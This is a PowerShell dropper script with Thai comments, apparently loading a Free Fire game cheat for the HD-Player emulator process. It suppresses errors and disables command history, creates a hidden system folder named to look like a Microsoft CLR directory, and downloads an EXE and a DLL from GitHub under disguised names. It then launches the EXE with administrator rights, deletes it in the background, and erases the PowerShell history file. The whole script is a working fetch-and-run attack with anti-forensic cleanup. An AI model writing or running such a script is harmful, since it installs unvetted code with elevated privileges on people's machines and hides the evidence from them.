# 1. จัดการเรื่องประวัติและข้อผิดพลาด (เน้นความเงียบ)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย (สร้างและซ่อนโฟลเดอร์)
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
& attrib +h +s $workDir

# กำหนดเส้นทางไฟล์เป้าหมาย
$exeOutput = Join-Path $workDir "WinHelper.exe"
$dllOutput = Join-Path $workDir "mscories.dll"

$exeUrl = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
$dllUrl = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
$targetProcess = "HD-Player"

# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลดไฟล์ใหม่ (ทั้ง EXE และ DLL)
if (Test-Path $exeOutput) { Remove-Item $exeOutput -Force }
if (Test-Path $dllOutput) { Remove-Item $dllOutput -Force }

# ดาวน์โหลด EXE
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exeOutput)
} catch {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exeOutput -UseBasicParsing
}

# ดาวน์โหลด DLL
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($dllUrl, $dllOutput)
} catch {
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllOutput -UseBasicParsing
}

# 4. ตรวจสอบไฟล์แล้วสั่งรันระบบแบบสิทธิ์ Admin
if (Test-Path $exeOutput) {
    try {
        $sh = New-Object -ComObject Shell.Application
        $sh.ShellExecute($exeOutput, "", "", "runas", 1)
        Start-Sleep -Seconds 3
    } catch {
        Start-Process -FilePath $exeOutput -Verb RunAs
    }
}

# 5. เปิดระบบบันทึกประวัติกลับมา และสั่ง CMD เก็บกวาดเบื้องหลัง (รอ 15 วินาทีแล้วลบไฟล์ EXE)
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
try {
    $cleanCmd = "timeout /t 15 && del /f /q `"$exeOutput`""
    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
} catch {}

# 6. รันคำสั่งลบประวัติใน PowerShell ทันทีก่อนปิดตัว
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
} catch {}

exit
